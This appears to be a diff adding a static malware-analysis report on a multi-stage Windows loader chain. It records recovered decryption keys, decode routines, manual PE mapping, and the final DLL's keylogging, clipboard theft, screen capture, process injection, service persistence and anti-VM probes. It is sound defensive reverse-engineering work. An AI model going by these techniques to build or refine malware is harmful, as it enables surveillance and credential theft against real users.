+Two sibling resource groups provide the persistence display/value string used by the script:
+
+- parent record `1169`: record `1171` decodes to `registryAutorunValue`; record `1173` decodes to `FEM Update Model Manager`
+- parent record `1174`: record `1176` decodes to `shedulerAutorunValue`; record `1178` decodes to `FEM Update Model Manager`
+
+Static PE triage of decoded record `1168`:
+
+```text
+format: PE32+ x86-64 Windows GUI executable
+reported/export name: act.exe
+compile timestamp: Thu May 7 17:06:59 2026
+compiler marker: Embarcadero Delphi for Win64 compiler version 32.0 (25.0.26309.314)
+image base: 0x400000
+entry point: 0x00b25450, file offset 0x724850
+size: 7,896,064 bytes
+signed: false
+NX: false
+canary: true
+```
+
+Exports:
+
+```text
+dbkFCallWrapperAddr
+__dbk_fcall_wrapper
+TMethodImplementationIntercept
+```
+
+Imports are mostly Delphi/VCL/runtime-support oriented. Imported DLLs observed so far are `oleaut32.dll`, `advapi32.dll`, `user32.dll`, `kernel32.dll`, `version.dll`, `netapi32.dll`, and `msvcrt.dll`. Static import review did not show direct WinHTTP or Winsock imports in this decoded PE. The binary does contain Delphi package/unit names such as `Winapi.WinInet`, `Winapi.IpHlpApi`, `System.ZLib`, `FireDAC.Phys.PGDef`, `FireDAC.Phys.OracleDef`, `IdSMTPBase`, and `IdQotdServer`; those are compiler/runtime/unit metadata strings and need xref-backed review before being treated as behavior.
+
+The parser also exposes a dispatcher-facing retrieval path for that PE-bearing resource. `0x10007e69`, reached from the main command dispatcher at `0x100274fd`, enumerates `16050` entries under root record `3` / tag `16002`, matches the selector in child tag `16051`, and reads/decrypts the tag `16100` payload, falling back to tag `16054`. `0x100086b9` is the corresponding create/update path for tag `16100`. This proves dispatcher-accessible recovery of the PE bytes. The script-level `previewer::load_exe($exe_bytes)` indicates intended in-memory loading of `@input`, but the retrieval accessor alone is payload recovery evidence, not by itself a process-launch proof.
+
+Structured parser routing observed so far:
+
+- `0x10050a81` parses root tag `16000` -> child `16003` -> seven `16005` entries, reads scalar tag `16010`, optional boolean-related `16011`/`16012`/`16013`, then calls `0x10051215`.
+- `0x10050d8d` parses root tag `16000` -> child `16004` -> three `16006` entries, reads tag `16020`, optionally handles an indexed `16022` structure, then calls `0x10051215`.
+- `0x10051215` parses nested tag `16030` containers. Entries expose scalar fields `16032`-`16037` and variant lists at `16040`/`16041`; tag `16042` selects the variant representation, including scalar, bytes, UTF-16 text, and boolean forms.
+
+The decoded `act.exe` entry path is also a loader. `entry0` at `0x00b25450` calls Delphi runtime setup at `0x00417da0`, then calls `0x00b25420`, then runtime cleanup at `0x0040e090`. `0x00b25420` calls initializer `0x00443100` and loader `0x00b25220`.
+
+`0x00443100` seeds the ASCII key string:
+
+```text
+36D6111FE68AE52A7B9E2095280EECAC
+```
+
+It also records the embedded blob length `0x592340`. `0x00b25220` resolves `kernel32.dll!VirtualAlloc`, writes the embedded blob at VA `0x00443270` / file offset `0x42670` into a stream, calls `0x00b24d20` to decrypt it, calls `0x00b24a00` to unpack it, allocates `VirtualAlloc(NULL, decoded_size, 0x3000, 0x40)`, copies the decoded stream into that RWX region, and calls the allocation through the tiny thunk at `0x00b24d10` (`call rcx; ret`).
+
+`0x00b24d20` dynamically resolves CryptoAPI functions from `advapi32.dll`:
+
+```text
+CryptAcquireContextA
+CryptCreateHash
+CryptHashData
+CryptDeriveKey
+CryptDecrypt
+CryptDestroyKey
+CryptDestroyHash
+CryptReleaseContext
+```
+
+The constants in the decryptor show `PROV_RSA_AES` (`0x18`), `CRYPT_VERIFYCONTEXT` (`0xf0000000`), `CALG_MD5` (`0x8003`), and `CALG_AES_256` (`0x6610`). Static replay of that path used the ASCII key string above, CryptoAPI's MD5-to-AES key expansion, AES-256-CBC with a zero IV, and PKCS#7 padding removal. This produced a valid ZIP:
+
+```text
+encrypted embedded blob:
+  path: auth-code-check-analysis/act_embedded_blob_0x443270_0x592340.enc.bin
+  size: 5,841,728
+  sha256: 72e4ecdbd5bfc150f9f43b8d9e04a07408f5da3bccda9c5080616c63d0f6067d
+
+decrypted ZIP, unpadded:
+  path: auth-code-check-analysis/act_embedded_blob_decrypted_aes256cbc_unpadded.bin
+  size: 5,841,713
+  sha256: 87892ebf77e8a33a3423ec3272d269116f7c6de58c3c29bed71c2ae46de3f228
+  format: ZIP, one LZMA-compressed unnamed member
+```
+
+The ZIP member decompresses to raw x64 code, not a PE:
+
+```text
+path: auth-code-check-analysis/act_inner_zip_extracted/act_embedded_blob_decrypted_aes256cbc_unpadded
+size: 8,865,864
+sha256: 06157c24ed9ad3b2a639ca901deac6a29c26861ab5f6da31093247eadec9139a
+first bytes: 50 48 8b 44 24 08 48 87 04 24 9c fc 50 51 52 41
+```
+
+The raw code begins with a register-save/bootstrap stub, a `call`/`pop` self-location sequence at `0x180000023`-`0x18000002d`, and `GS:[0x30]` state save/restore around the loader call. It is position-independent loader code rather than a standalone PE.
+
+Static disassembly of the raw x64 stage at base `0x180000000` shows a second-stage decode and manual PE map path. The bootstrap at `0x180000000` saves registers and flags, computes its position-independent base, stores context values on the caller stack, calls `0x18000009e`, and restores state before returning. The wrapper at `0x18000009e` calls setup helper `0x180000bb9`; its callee path at `0x1800000e6` then decodes bytes starting at `0x180000c48` through `0x1800001f8`.
+
+The setup helper at `0x180000bb9` obtains the PEB through `GS:[0x60]`, walks the loader list, identifies `kernel32.dll`, and fills a small resolver table. The export resolver at `0x18000092c` parses `MZ`/`PE` export structures. The hash helper at `0x180000af4` is CRC-32-like, using seed `0xf3e9b0ed`, polynomial `0xedb88320`, and final XOR `0xffffffff`.
+
+Resolved `kernel32.dll` APIs are stored in the table beginning at `0x1800008ec`:
+
+| Table entry | Hash | API |
+|---|---:|---|
+| `0x1800008ec` | `0x3d62797b` | `GetProcAddress` |
+| `0x1800008f8` | `0x4ab8084c` | `GetModuleHandleA` |
+| `0x180000904` | `0x56d6217c` | `LoadLibraryA` |
+| `0x180000910` | `0x60d991bb` | `VirtualAlloc` |
+| `0x18000091c` | `0x707fa1d5` | `RtlAddFunctionTable` |
+
+The decode loop at `0x1800001f8` uses:
+
+```text
+source offset: 0xc48 from the raw x64 blob base
+length: qword [base + 0xc40] = 0x873c00
+initial mask byte: 0x43
+index byte: starts at 0 and increments modulo 256
+operation: encoded_byte ^= 0x43 ^ index_byte
+```
+
+Static replay of that byte transform produced a valid PE:
+
+```text
+path: auth-code-check-analysis/raw_x64_decoded_pe_0xc48_0x873c00.bin
+size: 8,862,720
+sha256: 8035b177ca682962fd6501228ebd460ef174183ac08a87d81514bba3ecfd9502
+format: PE32+ x86-64 Windows GUI DLL
+image base: 0x400000
+entry point: 0x00b4e670, file offset 0x0074d670
+compiled: Thu May 7 17:06:52 2026
+signed: false
+NX: false
+canary: true
+reported/export library: bad.dll
+```
+
+Exports:
+
+```text
+dbkFCallWrapperAddr
+__dbk_fcall_wrapper
+TMethodImplementationIntercept
+s
+```
+
+The raw x64 stage treats the decoded bytes as a PE image. After decoding, it reads `e_lfanew` from `[decoded + 0x3c]`, reads `SizeOfImage` from the NT optional header, and calls resolved `VirtualAlloc(NULL, SizeOfImage, 0x3000, 0x40)` for committed/reserved RWX memory. Helper `0x180000380` copies PE headers and sections, `0x180000402` resolves imports using `LoadLibraryA` and `GetProcAddress`, `0x180000522` applies `DIR64` base relocations, `0x180000272` registers x64 unwind metadata through `RtlAddFunctionTable`, `0x1800002e1` executes TLS callbacks, and `0x180000252` returns the mapped entry point. The loader then calls that entry with arguments resembling `DllMain(base, DLL_PROCESS_ATTACH, NULL)`.
+
+Negative findings for this outer raw loader are also useful. It has no PE header, imports, exports, resources, compiler metadata, or plaintext configuration. Static string extraction and non-extracting signature scans did not find credible URLs, domains, IPs, registry paths, scheduled-task strings, credential target names, process names, mutex strings, or embedded-file signatures in the still-obfuscated raw stage. The decisive behavior sits in the decoded PE at `0xc48`.
+
+Initial import triage of the decoded PE shows a much broader capability surface than the outer `act.exe` loader. Imported DLLs include:
+
+```text
+oleaut32.dll
+advapi32.dll
+user32.dll
+kernel32.dll
+gdi32.dll
+version.dll
+mpr.dll
+shfolder.dll
+netapi32.dll
+ole32.dll
+msvcrt.dll
+crypt32.dll
+ws2_32.dll
+shell32.dll
+wininet.dll
+ncrypt.dll
+cryptui.dll
+wsock32.dll
+ntdll.dll
+wtsapi32.dll
+iphlpapi.dll
+winmm.dll
+winspool.drv
+shlwapi.dll
+avifil32.dll
+rpcrt4.dll
+```
+
+Notable imported APIs include `WSAStartup`, `gethostbyname`, `socket`, `connect`, `send`, `recv`, `InternetSetOptionW`, `CryptAcquireContextA/W`, `CryptDeriveKey`, `CryptEncrypt`, `CryptDecrypt`, many `crypt32` certificate/PFX APIs, `NCrypt*` key-management APIs, `CreateProcessW`, `WriteProcessMemory`, `VirtualAllocEx`, `VirtualProtect`, `IsDebuggerPresent`, `OpenProcess`, registry APIs, service APIs, clipboard APIs, keyboard/mouse input APIs, `PrintWindow`, `WNetOpenEnumW`, `GetAdaptersInfo`, `WTSQueryUserToken`, and `RtlCompressBuffer`.
+
+String triage found many library/runtime and decoy-looking text fragments. Network-like literals include DNS-over-HTTPS endpoints and ACME/certificate-service URLs such as `https://cloudflare-dns.com/dns-query`, `https://dns.google/dns-query`, `https://dns.quad9.net/dns-query`, `https://acme-v02.api.letsencrypt.org/directory`, and `https://api2.servertastic.com`. These are imported/string evidence only. They are not yet xref-backed C2 findings.
+
+### Raw x64 decoded PE startup notes
+
+The final decoded PE is a DLL-style payload. Its entry point at `0x00b4e670` is still runtime-heavy, but the visible startup path is now partially mapped:
+
+```text
+0x00b4e670
+  -> 0x0040f120(runtime/setup gate)
+  -> if setup result is 0, 0x0041a550(context, 0x00b4e720, arg1, arg2, arg3)
+  -> stores 0x00b4e630 in a global callback slot at 0x00c0a288
+  -> 0x00b4e630(1)
+  -> 0x0040f280(runtime cleanup/finalizer)
+```
+
+`0x00b4e630(1)` calls `0x00b4d900`. That function parses launch context, compares against `RUNDLL32.EXE`, and uses the nearby strings `DllRegisterServer`, `ServiceMain`, and `SVCHOST.EXE`. It can start worker `0x00b4e380` through `CreateThread` and then marks a global active byte at offset `+0x56c`. Current interpretation: the DLL supports several Windows launch modes, including rundll32/regsvr-style invocation and service/svchost-style execution. This is a static launch-mode interpretation, not proof that each mode is used in this infection chain.
+
+Export `s` at `0x00b4e590` is also a worker trigger. When passed a non-null argument, it copies five qwords from the caller's buffer into global context at offset `+0x8b4`. If the global active byte at `+0x56c` is not set, it either calls `0x00b4e380(0)` directly or starts `0x00b4e380` with `CreateThread`, depending on a global flag at `+0x8cc`. It returns `0`.
+
+Worker `0x00b4e380` has three visible branches:
+
+- If global byte `+0x574` is set, it treats a global field around `+0x550` as service-table material, installs service-main function `0x00b4b550`, and calls `StartServiceCtrlDispatcherW`.
+- If global dword `+0x15d4` is below `0x1519`, it calls helper `0x00a6b550` and then reaches an `ExitProcess(global+0x1264)` branch.
+- Otherwise it loops while global byte `+4` is unset: it calls `0x00b47170(0)`, sleeps `1500` ms, and repeats. When the flag changes, it calls cleanup helper `0x00b4d420` and exits.
+
+The loop helper `0x00b47170` registers a window class, creates a hidden/message-window style object through `CreateWindowExW`, calls `ChangeWindowMessageFilterEx(hwnd, WM_COPYDATA=0x4a, MSGFLT_ALLOW=1, NULL)`, hides the window with `ShowWindow(hwnd, 0)`, updates it, runs the standard `GetMessageW` / `TranslateMessage` / `DispatchMessageW` loop, and destroys the window before returning. Cleanup helper `0x00b4d420` frees several global allocations and calls `VirtualFree(*global, 0x1678, MEM_RELEASE)`.
+
+Initial import-xref checks found concrete capability call sites inside the decoded PE:
+
+| Area | Static evidence |
+|---|---|
+| Socket networking | `0x00b0b220` calls `WSAStartup(0x0202)`, creates an IPv4 TCP socket, reads port/IP material from `0x00c104a8` and `0x00c104ac`, and calls `connect` at `0x00b0b2b9`. Those fields are zero-initialized in the static file, so no final C2 endpoint has been recovered from this PE. `send` and `recv` have many callers in the `0x00b0...` and `0x00b2...` ranges. |
+| Remote-process memory and thread context | `0x00a18fb0` calls `VirtualAllocEx(..., 0x3000, PAGE_EXECUTE_READWRITE)` and `WriteProcessMemory`. Parent paths around `0x00a19040` and `0x00a196a0` resolve `Wow64GetThreadContext` / `Wow64SetThreadContext`, open the target process/thread, suspend the thread, call the injector, and resume/post to the thread. |
+| Keylogging | Function `0x00b39e10` installs `SetWindowsHookExW(WH_KEYBOARD_LL=0x0d, hook=0x00b39ff0)` at `0x00b3a37c`-`0x00b3a390`. The hook path records labels such as `[ENTER]`, `[TAB]`, and `DEL` around `0x00b3a0fd`-`0x00b3a1ef`, then passes events to `CallNextHookEx`. |
+| Clipboard collection | `0x00b385b0` opens the clipboard, tries `GetClipboardData(CF_UNICODETEXT=13)`, falls back to `CF_TEXT=1`, locks the global memory with `GlobalLock`, copies the content into an internal string/object, unlocks, and closes the clipboard. |
+| Screen/video capture | `PrintWindow` is called from functions around `0x007aa6d0` and `0x00b0a290`. Function `0x00b3c180` also captures the desktop with `GetDesktopWindow`, `GetDC`, `CreateDIBSection`, `BitBlt`, and `GetDIBits`, then initializes AVI output through `AVIFileInit`, `AVIFileOpenW`, `AVIFileCreateStreamW`, `AVIMakeCompressedStream`, and `AVIStreamSetFormat`. |
+| Certificate/PFX material | `PFXExportCertStoreEx` is called from `0x00a7ea70`; `NCryptExportKey` is called from functions around `0x00973660` and `0x00974860`. |
+| Service/registry persistence surface | `0x00a6bd90` opens service/registry material and calls `CreateServiceW` at `0x00a6c474` with auto-start (`dwStartType=2`). The same helper writes `ImagePath` as `svchost.exe -k LocalService`, writes `Parameters\ServiceDll`, and edits `SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost\LocalService`. `RegSetValueExW` is also called from `0x0079e850`. |
+
+String/type metadata in this PE is broad. RTTI-like strings include `TLogType`, `ltPassword`, `ltSystem`, `ltHistory`, `ltScreen`, `ltVideo`, `ltKeyLogger`, `ltClipBoard`, `ltInfoFiles`, `ltArchive`, `ltBigFile`, `ltBrowser`, `ltCookies`, `ltCredentials`, `ltWallet`, `TBotDataRecord`, `UserID`, `DataSize`, and `UScreenOperation`. Other metadata clusters include `Profiles`, `Process`, `GetCookies`, `GetPassword`, `CertInstall`, `GetProgramCredentials`, `History`, `Keys`, `Wallets`, `Screens`, `Videos`, `Browser`, `Cookies`, `Files`, `Credentials`, and `SaveToZip`.
+
+Important caveat: direct xref searches for `ltKeyLogger`, `GetCookies`, and `GetProgramCredentials` did not find call sites in the current pass. Treat these as type/runtime metadata until specific functions are mapped. The keylogger and clipboard claims above are not based on those metadata strings; they are based on direct API call sites and hook/clipboard handling code. Likewise, DNS-over-HTTPS and ACME/certificate-service URL strings remain library/config surface, not final C2 evidence.
+
+The next PE-specific pass should decompile and name the control-message and configuration paths that reach these functions. The strongest unresolved question is not whether the PE contains stealer/surveillance, TCP, persistence, and injection code. Static evidence confirms those capabilities. The unresolved question is which hidden-window messages, service mode, export input, or later configuration fields activate each capability and whether the zero-initialized endpoint fields are filled from local config, IPC, or a network response.
+
+### API resolver and wrappers
+
+The following `0x100...` notes belong to the earlier `Stream.Toolkit.dat` decoded shellcode, not to the final PE at image base `0x400000`.
+
+The decoded payload resolves imports manually.
+
+- `0x10040f79` walks a loaded module's PE export table and compares each export-name hash to the requested 64-bit API hash.
+- `0x10041aa9` is the forwarder-aware export resolver. It handles normal export RVAs and forwarded export strings.
+- `0x100422dd` is the cache layer. It stores triplets of `module_hash`, `api_hash`, and `function_pointer`, protected by lock/unlock callbacks at context offsets `0x30` and `0x38`.
+- `0x10040a95` is the export-name hash routine. It starts with `0x811c9dc5`, then for each byte computes `hash = (hash ^ byte) * (0x1000193 + index)` with 64-bit wrap.
+- `0x1003a58d` lowercases ASCII `A-Z` when the hash caller requests case-folding.
+
+The same hash routine, with lowercasing enabled, maps the module IDs used by the sample:
+
+| Module hash | Module |
+|---|---|
+| `0x06562b75966f9220` | `kernel32.dll` |
+| `0x580c39db8bc4f174` | `ntdll.dll` |
+| `0x2a41af6decefaa20` | `advapi32.dll` |
+| `0x445ca91e2438bff0` | `user32.dll` |
+| `0xd4505403e23e3bdc` | `shell32.dll` |
+| `0x35bdf8eb3841e354` | `ole32.dll` |
+| `0xf3f688586089a8d4` | `gdi32.dll` |
+| `0xc4509daf51006620` | `oleaut32.dll` |
+| `0x882de2bedc856030` | `bcrypt.dll` |
+| `0x20c84cf82307e244` | `mscoree.dll` |
+| `0xd406a3a4a62c00bc` | `userenv.dll` |
+| `0xeeb74b78dc5f0920` | `wtsapi32.dll` |
+| `0x5731b859ff76a320` | `iphlpapi.dll` |
+
+Static extraction found 187 resolver call sites, 186 unique API hashes, and 13 distinct module hashes in the wrapper region. A local hash match against known Windows API names mapped 155 of those calls. Additional GitHub-hosted ReactOS and Wine export specs were then used as an export-name corpus for the remaining hashes:
+
+- `https://github.com/reactos/reactos/blob/master/dll/win32/kernel32/kernel32.spec`
+- `https://github.com/reactos/reactos/blob/master/dll/ntdll/def/ntdll.spec`
+- `https://github.com/reactos/reactos/blob/master/dll/win32/advapi32/advapi32.spec`
+- `https://github.com/reactos/reactos/blob/master/win32ss/user/user32/user32.spec`
+- `https://github.com/reactos/reactos/blob/master/dll/win32/wtsapi32/wtsapi32.spec`
+- `https://github.com/reactos/reactos/blob/master/dll/win32/iphlpapi/iphlpapi.spec`
+- `https://github.com/wine-mirror/wine/blob/master/dlls/ntdll/ntdll.spec`
+- `https://github.com/wine-mirror/wine/blob/master/dlls/user32/user32.spec`
+- `https://github.com/wine-mirror/wine/blob/master/dlls/gdi32/gdi32.spec`
+
+Under that export-name corpus, all extracted wrapper call-site API hashes now have candidate API names. Important mapped APIs include:
+
+```text
+kernel32.dll: CreateFileW, ReadFile, WriteFile, FindFirstFileW, FindNextFileW,
+              CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
+              Module32FirstW, Module32NextW, VirtualAlloc, VirtualProtect,
+              AddVectoredExceptionHandler, RemoveVectoredExceptionHandler,
+              CreateThread, OpenProcess, TerminateProcess, Sleep,
+              DeleteTimerQueueEx, console screen-buffer helpers
+
+advapi32.dll: RegOpenKeyExW, RegSetValueExW, RegQueryValueExW,
+              RegEnumKeyExW, RegDeleteValueW, OpenSCManagerW, CreateServiceW,
+              OpenServiceW, DeleteService, ChangeServiceConfig2W,
+              OpenProcessToken, GetTokenInformation, DuplicateTokenEx,
+              SetTokenInformation, CreateProcessAsUserW
+
+user32.dll: MessageBoxW, FindWindowW, ShowWindow, CreateWindowExW,
+            GetMessageW, RegisterClassExW, GetForegroundWindow,
+            SetLayeredWindowAttributes, DrawTextW,
+            RegisterPowerSettingNotification, UnregisterPowerSettingNotification
+
+wtsapi32.dll/userenv.dll: WTSEnumerateSessionsW, WTSQuerySessionInformationW,
+                          WTSRegisterSessionNotification,
+                          WTSUnRegisterSessionNotification,
+                          WTSQueryUserToken, WTSFreeMemory,
+                          CreateEnvironmentBlock, DestroyEnvironmentBlock
+
+mscoree.dll/oleaut32.dll/ole32.dll: CLRCreateInstance, CoInitializeEx,
+                                    CoCreateInstance, SafeArray*,
+                                    SysAllocString, VariantInit, VariantClear
+
+ntdll.dll: RtlInitializeConditionVariable, RtlGetProcessHeaps,
+           RtlAcquireSRWLockShared, RtlReleaseSRWLockShared,
+           RtlAcquireSRWLockExclusive, RtlReleaseSRWLockExclusive,
+           RtlImageNtHeader, RtlImageDirectoryEntryToData,
+           RtlCompareMemory, NtCreateSection, NtMapViewOfSection,
+           NtQueryVirtualMemory, NtProtectVirtualMemory
+
+gdi32.dll/iphlpapi.dll: CreateFontW, SelectObject, DeleteObject,
+                        SetBkMode, SetBkColor, SetTextColor, TextOutW,
+                        GetIpStatistics
+
+bcrypt.dll: BCryptGenRandom
+```
+
+The resolver table contains `winhttp.dll` and `ws2_32.dll` module hashes, but this extraction did not find wrapper call sites that resolve WinHTTP or Winsock API names in the decoded `Stream.Toolkit` payload. The observed network delivery remains upstream in the JavaScript/PowerShell chain.
+
+### Behavior proof points in the decoded payload
+
+The storage runner now has an end-to-end static path into the dispatcher:
+
+```text
+0x10052841 entry path
+  -> 0x10052a81 searches candidate storage files
+  -> 0x10051b39 builds the runtime context from the recovered storage object
+  -> 0x1005079d parses the storage object into internal containers
+  -> 0x10051f85 registers top-level handler groups
+  -> 0x10051c15 iterates parsed top-level entries
+  -> 0x10051d99 dispatches each entry directly or through CreateThread
+  -> 0x10051d49 calls 0x10051e51
+  -> 0x1000c6e5 resolves the entry group and calls 0x1000cc05
+```
+
+`0x10051f85` registers the same top-level group IDs routed by the master dispatcher: `300`, `400`, `500`, `600`, `700`, `1000`, `0x44c`, `0x4b0`, `0x514`, `0x5dc`, `0x6a4`, `0x708`, `0x76c`, `0x7d0`, `0x834`, and `0x898`. This makes the dispatcher table part of the parsed-storage execution model rather than a detached helper table.
+
+The key bridge is `0x1000c6e5`. It looks up a group object using the parsed entry's group value, stores a next/continuation value from `entry+0x28`, and then calls:
+
+```text
+0x1000cc05(context, resolved_group_object, entry+0x10, entry+0x18, entry+0x20)
+```
+
+After the dispatcher returns, `0x10051e51` either invokes the returned object through `0x10007c19` or, when the parsed entry has a non-null `entry+0x20` and `entry+0x10` is not `0x5e1` or `0x5e2`, through `0x10007b21`. It then uses `0x1000c9cd` to find the next entry whose first qword matches the stored continuation value. If no match is found, `0x1000c9cd` returns `0xffffffffffffffff` and the loop stops.
+
+The decoded shellcode is command-driven. The top-level dispatcher at `0x1000cc05` reads the value stored at `object+8` through `0x10006159`, then routes that value to grouped handlers. Static routing observed so far:
+
+```text
+300    -> 0x10006ef9
+400    -> 0x1000ac6d
+500    -> 0x1002ea79
+600    -> 0x1002259d
+700    -> 0x1000d48d
+1000   -> 0x100252dd
+0x44c  -> 0x10000191
+0x4b0  -> 0x1002e001
+0x514  -> 0x10006241
+0x5dc  -> 0x100274fd
+0x6a4  -> 0x10013b71
+0x708  -> 0x100010ed
+0x76c  -> 0x1002fde9
+0x7d0  -> 0x1000efad
+0x834  -> 0x10002901
+0x898  -> 0x1001dd25
+```
+
+`0x100010ed` is the handler for command IDs `0x709` through `0x717`. Persistence, service installation, and several file/registry/service helper paths are exposed through this group rather than executed unconditionally at shellcode entry.
+
+Other top-level groups are being reduced in the same way. Current static map:
+
+| Top-level group | Handler | Command IDs observed | Static behavior |
+|---|---|---|---|
+| `300` | `0x10006ef9` | `0x12d`, `0x12e` | Delay/control group. `0x12d` parses a numeric value, multiplies it by `1000`, and calls the `Sleep` wrapper at `0x10045291`. `0x12e` calls the same wrapper with `0xffffffff`, so this is an indefinite sleep/wait branch. |
+| `400` | `0x1000ac6d` | `0x191`-`0x193` | UI group. It resolves `MessageBoxW` through `0x10043e55`, and contains two window/display helpers. `0x1000a499` decodes `Progman`, `Shell_TrayWnd`, and `Static`, resolves user32 calls such as `FindWindowW`, `GetDesktopWindow`, `GetSystemMetrics`, `CreateWindowExW`, `SetLayeredWindowAttributes`, `UpdateWindow`, `DestroyWindow`, and `Sleep`, and appears to create or animate a desktop/taskbar-covering overlay. `0x1000a1f5` creates a smaller `Static`-class window path. |
+| `500` | `0x1002ea79` | `0x1f5`-`0x1f9` | Host/profile collection group. Wrappers resolve `GetSystemInfo`, `GlobalMemoryStatusEx`, `GetComputerNameW`, `GetUserNameW`, `GetUserDefaultLocaleName`, and `GetLocaleInfoEx`, then return numbers or bounded strings through the internal result-object helpers. |
+| `600` | `0x1002259d` | `0x259`-`0x26d` | Module/runtime control group. `0x259`, `0x26c`, and `0x26d` return current-module path variants through `GetModuleFileNameW`: full path, directory component, and filename component. `0x25a`/`0x25b` use a Toolhelp module snapshot path to locate a loaded module by name. `0x25c` calls `LoadLibraryW` and returns the handle; `0x25d` resolves a handle from the internal loader list and calls `FreeLibrary`; `0x25e`/`0x25f` test internal module-list state. `0x260`/`0x261` call `GetCurrentProcess` and `NtUnmapViewOfSection` against a named or numeric module address. `0x265`/`0x266` add and remove vectored exception handlers; `0x26b` calls `ExitProcess(0)`. Remaining cases are PE/module inspection and path-matching helpers, including checks around a module `.data` section and loaded-module path iteration. |
+| `700` | `0x1000d48d` | `0x2bd`-`0x2cf` | Path/container helper group. It is mostly internal string/list/object work, but helper `0x1003f5e9` resolves `GetFileAttributesW` and tests attribute bit `0x10` for directory checks, while helper `0x1003f58d` resolves `DeleteFileW`. Other cases compare, transform, aggregate, and iterate internal containers through helpers around `0x1003f...`, `0x100405...`, `0x100409...`, and `0x1000ec...`. |
+| `1000` | `0x100252dd` | `0x3e9`-`0x3f0` | Async task/callback object group. It allocates an `0x50`-byte object, stores context pointers at offsets such as `0x18` and `0x48`, inserts/removes callback records, can launch a worker thread through the `CreateThread` wrapper at `0x100448a5`, signals through `SetEvent` wrapper `0x10044c11`, and uses ntdll SRW-lock wrappers (`RtlAcquireSRWLockShared`, `RtlReleaseSRWLockShared`, `RtlAcquireSRWLockExclusive`, `RtlReleaseSRWLockExclusive`) around internal lists. |
+| `0x44c` | `0x10000191` | `0x44d`-`0x45a`, `0x460`, `0x461` | Anti-analysis and environmental probe group. The early cases create a probe context through `0x10030e69`/`0x10030edd`, then call VM classifiers such as `0x10030f9d`, `0x10031365`, and `0x1003184d`; those paths use CPUID hypervisor vendor strings and `HKLM\SYSTEM\CurrentControlSet\Services` enumeration to classify VMware, VirtualBox, Hyper-V, QEMU, Xen, and Parallels markers into numeric classes at `object+0x14`. Later cases build a timed probe context with `CreateEventW`, `WaitForSingleObject`, and `GetTickCount64`/`GetTickCount`. Screen-layout probes call `GetSystemMetrics`; foreground-window churn is measured with `GetForegroundWindow` in `0x10033a85`; network activity is measured through two `GetIpStatistics` snapshots in `0x10033b69`, which compares traffic deltas over a timed window. |
+| `0x4b0` | `0x1002e001` | `0x4b1`-`0x4b5` | Worker/callback object lifecycle group. `0x4b1` allocates an `0x50`-byte object via `0x10023f85`, initializes it in `0x1002cf45`, creates event handles with `CreateEventW`, binds the parent context at object offset `0x38`, and registers the object under the `0x4b0` group. `0x4b2` looks up the object, associates callback masks `1`, `2`, `4`, `8`, `0x10`, `0x20`, `0x40`, and `0x80`, then starts a worker through `CreateThread` in `0x1002d1ed` and waits up to `5000` ms through `WaitForSingleObject` for readiness. `0x4b3` signals stop through `SetEvent`; `0x4b4` returns whether the object has an active worker pointer; `0x4b5` stops, unregisters, closes handles, frees the runtime context, and returns success/failure. |
+| `0x514` | `0x10006241` | `0x515`-`0x51a` | Internal typed-value/result adapter group. `0x515` validates or opens the backing object through `0x10039c15`; `0x516` clears object state through `0x10039b45`; `0x517` iterates every argument in the supplied container and appends typed values into a collection before committing it with `0x1003a1dd`. Numeric values are appended through `0x1004e849`/`0x1004f5c9`; booleans can be rendered through decoded UTF-16 strings `true` and `false`; object-backed values are read under SRW-lock wrappers (`0x100450b1`/`0x10045129`) when needed. `0x518` exports the current collection through `0x10039f05`; `0x519` validates collection state through `0x1003a2f5`; `0x51a` looks up an object and tests or attaches it through `0x10039e7d`. |
+| `0x5dc` | `0x100274fd` | `0x5dd`-`0x616` | Core interpreter primitive group. This switch mostly operates on parsed command/runtime state rather than Windows APIs. `0x5dd` ensures a group/runtime object exists through `0x10025f95`; `0x5de` frees/removes a group object and drains queued entries; `0x5df` increments a group counter; `0x5e0` removes queued entries matching the current counter. `0x5e1`/`0x5e2` are special control-flow cases: `0x5e1` looks up an entry through an internal continuation list, while `0x5e2` searches records by the current group generation and returns the matching continuation/object pointer. Cases `0x5e7`-`0x5ef` handle equality/ordering-style tests across integer, object, string, and boolean representations. Later cases implement integer arithmetic, bitwise/not, list and string helpers, formatting/conversion helpers, and typed result export. The runner treats `0x5e1`/`0x5e2` differently after dispatcher return, which lines up with those being jump/continuation primitives. |
+| `0x6a4` | `0x10013b71` | `0x6a5`-`0x6c7` | Windows known-folder/environment path catalog. Each case appends one resolved path into an internal string collection and returns it. Most helpers call `SHGetKnownFolderPath` through `0x1003ba71` with embedded known-folder GUIDs; `0x1003d4ad` uses `GetTempPathW`. This gives the parsed command stream indirect access to profile, shell, and temporary paths without storing those paths as plaintext in the storage file. |
+| `0x708` | `0x100010ed` | `0x709`-`0x717` | Persistence lifecycle group. This switch exposes HKCU/HKLM Run writes/deletes/checks, Startup-folder `.lnk` create/delete/check helpers, Windows service create/delete/check helpers, and Task Scheduler create/delete/check helpers. The detailed persistence evidence follows this table. |
+| `0x76c` | `0x1002fde9` | `0x76d`-`0x777` | Timer-queue object lifecycle group. `0x76d` allocates and registers a `0x38`-byte object, initializes a timer queue through `CreateTimerQueue`, and sets up an SRW-locked record list. `0x76e` adds a timer record and calls `CreateTimerQueueTimer`; `0x76f` removes records by key; `0x770`-`0x772` change/suspend/resume timer records through `ChangeTimerQueueTimer`; `0x773` checks record state; `0x774` returns a count/value from the object; `0x775`/`0x776` stop or drain timer records; `0x777` unregisters the object and frees it. Confirmed wrappers include `CreateTimerQueue`, `CreateTimerQueueTimer`, `DeleteTimerQueueTimer`, and `ChangeTimerQueueTimer`, with SRW-lock wrappers around the internal record list. |
+| `0x7d0` | `0x1000efad` | `0x7d1`-`0x7f1` (sparse) | Internal collection primitive group. It creates list-like objects tagged `0x5209` and numeric-list objects tagged `0x520a`, then implements index/read, filter/search, contains/any/all, remove, append, insert, clear, count, sum, min/max, range/slice, and in-place update operations. Access to shared collection backing stores is guarded with SRW-lock wrappers. |
+| `0x834` | `0x10002901` | `0x835`-`0x848` | Internal byte/string buffer primitive group. It creates objects tagged `0x520b` and supports length, clear, fill, copy/clone, append, insert, range/slice, compare/equality, find, contains/prefix/suffix-style checks, remove, and replace-like operations over the buffer. Several paths accept either a string argument or another `0x520b` object and copy bytes while holding SRW locks. |
